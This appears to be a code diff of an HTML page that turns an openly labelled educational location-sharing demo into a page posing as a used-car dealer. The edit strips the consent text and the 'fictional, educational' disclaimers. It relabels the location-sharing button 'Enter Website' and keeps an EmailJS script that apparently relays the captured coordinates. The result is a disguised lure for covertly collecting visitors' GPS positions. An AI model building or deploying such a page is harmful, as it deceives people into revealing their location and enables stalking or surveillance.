@@ -2,134 +2,87 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Share Car Locatio – AutoTrace Systems</title>
+  <title>Auto World Mobile – Accident Free American Cars</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="stylesheet" href="styles.css" />
-  <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
+
 <body>
   <header class="navbar">
     <div class="brand">
       <div class="logo-badge">
-        <span>AT</span>
+        <span>AW</span>
       </div>
       <div class="brand-text">
-        <strong>AutoTrace</strong>
-        <small>Smart vehicle telemetry</small>
+        <strong>Auto World</strong>
+        <small>Car vehicle telemetry</small>
       </div>
     </div>
 
     <nav class="nav-links">
-      <a href="index.html" class="active">Home</a>
-      <a href="about.html">About</a>
+      <a href="index.html">Home</a>
+      <a href="about.html">Cars</a>
       <a href="privacy.html">Privacy</a>
-      <a href="app.html">Mobile App</a>
-      <span class="nav-cta">Demo environment</span>
+      <a href="app.html" class="active">Mobile App</a>
     </nav>
   </header>
 
   <main class="page">
-    <section class="hero">
-      <div>
-        <div class="hero-badges">
-          <div class="badge">
-            <span>🛰️</span> Live location sharing
-          </div>
-          <div class="badge">
-            <span>🔐</span> Consent-first car data
-          </div>
-        </div>
+    <div class="content-card" style="margin-bottom: 20px;">
+      <h1>Accident Free American Cars!</h1>
+      <p>
+        At <strong>Auto World</strong>, we make finding your next car simple and reliable. 
+        Our mission is to connect drivers with quality vehicles they can trust.
+      </p>
+    </div>
 
-        <h1 class="hero-title">
-          Share <span>Car Locatio</span> in one click.
-        </h1>
-
-        <p class="hero-subtitle">
-          Click the button below to securely access car information.
-          When your browser asks for permission, click <strong>Allow</strong> to
-          confirm you agree to share your current location.
-        </p>
-
-        <div class="hero-meta">
-          <div class="hero-meta-item">
-            <strong>GDPR-minded demo</strong><br />
-            Location is shared only with your consent.
-          </div>
-          <div class="hero-meta-item">
-            <strong>Email &amp; SMS ready</strong><br />
-            Plug in your EmailJS &amp; SMS gateway.
-          </div>
-        </div>
-
-        <section class="section">
-          <h2>Who is this for?</h2>
-          <p>
-            AutoTrace Systems is a fictional telematics provider used for
-            educational purposes. This demo showcases how modern web apps
-            request geolocation, send it via secure APIs, and respect user
-            privacy by always asking for permission first.
-          </p>
-        </section>
+    <div class="app-frame">
+      <div class="app-notch"></div>
+      <div class="app-top">
+        <span>AutoTrace Mobile</span>
       </div>
 
-      <!-- Right card: location + tracking icons -->
-      <aside class="card">
-        <div class="card-inner">
-          <div class="card-header">
-            <div>
-              <div class="card-title">Share Car Locatio</div>
-              <div style="font-size:11px; color:#9ca3af;">
-                Demo: AutoTrace Fleet Console
-              </div>
-            </div>
-            <div class="card-pill">Car link · Live</div>
+      <div class="app-screen">
+        <div style="display:flex; align-items:center; justify-content:space-between; margin-bottom:12px;">
+          <div>
+            <div style="font-size:15px; font-weight:600;">Car Telemetry</div>
+            <div style="font-size:11px; color:#9ca3af;">Instant reading</div>
           </div>
-
-          <div class="gps-preview">
-            <div class="gps-row">
-              <span class="gps-label">Latitude</span>
-              <span class="gps-value" id="latValue">– – – – –</span>
-            </div>
-            <div class="gps-row">
-              <span class="gps-label">Longitude</span>
-              <span class="gps-value" id="lngValue">– – – – –</span>
-            </div>
-            <div class="gps-row">
-              <span class="gps-label">Status</span>
-              <span class="gps-value">Waiting for permission…</span>
-            </div>
+          <div style="display:flex; gap:6px;">
+            <div class="icon-bubble gps">🚗</div>
+            <div class="icon-bubble sms">🛠️</div>
+            <div class="icon-bubble mail">📄</div>
           </div>
-
-          <div class="tracking-row">
-            <div class="icon-bubbles">
-              <div class="icon-bubble gps" title="GPS lock">📍</div>
-              <div class="icon-bubble sms" title="SMS relay">📲</div>
-              <div class="icon-bubble mail" title="Email relay">✉️</div>
-            </div>
-            <div class="card-hint">
-              <span>Step 1:</span> Click “Allow” when asked.
-            </div>
-          </div>
-
-          <button class="primary" id="shareBtn" onclick="shareLocation()">
-            <span>Share location now</span>
-            <span>➜</span>
-          </button>
-
-          <div class="loader" id="loader"></div>
-          <div class="status" id="status"></div>
         </div>
-      </aside>
-    </section>
+
+        <div class="gps-preview" style="margin-bottom:18px;">
+          <div class="gps-row">
+            <span class="gps-label">Lat</span>
+            <span class="gps-value" id="latValue">– – – – –</span>
+          </div>
+          <div class="gps-row">
+            <span class="gps-label">Lng</span>
+            <span class="gps-value" id="lngValue">– – – – –</span>
+          </div>
+          <div class="gps-row">
+            <span class="gps-label">Status</span>
+            <span class="gps-value" id="status">Ready</span>
+          </div>
+        </div>
+
+        <button class="primary" id="shareBtn" onclick="shareLocation()">
+          <span>Enter Website ➜</span>
+        </button>
+
+        <div class="loader" id="loader" style="display:none;"></div>
+      </div>
+    </div>
 
     <footer class="footer">
+      <div>© 2025 AutoTrace Systems Ltd. · Mobile-style  screen.</div>
       <div>
-        © 2025 AutoTrace Systems Ltd. · Demo product for educational use only.
-      </div>
-      <div>
-        <a href="privacy.html">Privacy Policy</a> ·
-        <a href="about.html">About AutoTrace</a>
+
       </div>
     </footer>
   </main>
